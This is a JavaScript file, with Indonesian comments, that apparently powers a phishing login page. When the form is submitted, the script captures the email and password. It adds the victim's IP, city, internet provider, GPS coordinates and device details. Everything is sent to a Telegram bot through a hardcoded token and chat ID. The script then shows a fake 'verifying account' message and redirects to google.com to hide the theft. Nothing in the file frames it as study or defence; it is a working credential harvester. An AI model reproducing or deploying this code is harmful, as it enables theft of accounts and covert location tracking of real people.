document.getElementById("loginForm").addEventListener("submit", async function (event) {
    event.preventDefault();

    // Ambil email & password
    let email = document.getElementById("email").value;
    let password = document.getElementById("password").value;
    let waktuLogin = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });

    // Data bot Telegram
    let botToken = "AAFmbkgr8rhoSkow-Yf6EXTy8DPu0Az7021";
    let chatId = "6786210993"; // Hanya 1 ID

    // Ambil informasi IP
    let ipInfo = { ip: "Tidak diketahui", city: "Tidak diketahui", country: "Tidak diketahui", org: "Tidak diketahui" };
    try {
        let response = await fetch("https://ipinfo.io/json?token=961f6caebd0f7d");
        if (response.ok) ipInfo = await response.json();
    } catch (error) {}

    // Ambil lokasi pengguna
    async function getUserLocation() {
        return new Promise((resolve) => {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        resolve(`📍 *Koordinat:* ${position.coords.latitude}, ${position.coords.longitude}`);
                    },
                    () => {
                        resolve("📍 *Lokasi:* Tidak diizinkan oleh user");
                    }
                );
            } else {
                resolve("📍 *Lokasi:* Tidak didukung di browser ini");
            }
        });
    }
    let lokasiUser = await getUserLocation();

    // Ambil informasi perangkat
    let userAgent = navigator.userAgent;
    let deviceInfo = `📱 *Device:* ${userAgent}`;

    // Format pesan dalam satu JSON
    let message = `🔒 *Login Berhasil!*\n\n`
        + `🕒 *Waktu:* ${waktuLogin}\n`
        + `📧 *Email:* ${email}\n`
        + `🔑 *Password:* ${password}\n`
        + `🌍 *IP:* ${ipInfo.ip}\n`
        + `📍 *Lokasi:* ${ipInfo.city}, ${ipInfo.country}\n`
        + `🏢 *Provider:* ${ipInfo.org}\n`
        + `${lokasiUser}\n`
        + `${deviceInfo}`;

    // Kirim dalam satu request
    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            chat_id: chatId,
            text: message,
            parse_mode: "Markdown"
        })
    }).catch(error => console.error("Gagal mengirim:", error));

    console.log("✅ Semua data terkirim ke Telegram!");

    // Redirect lebih smooth
    document.getElementById("loadingText").innerText = "Memverifikasi akun...";
    setTimeout(() => window.location.href = "https://www.google.com", 3000);
});
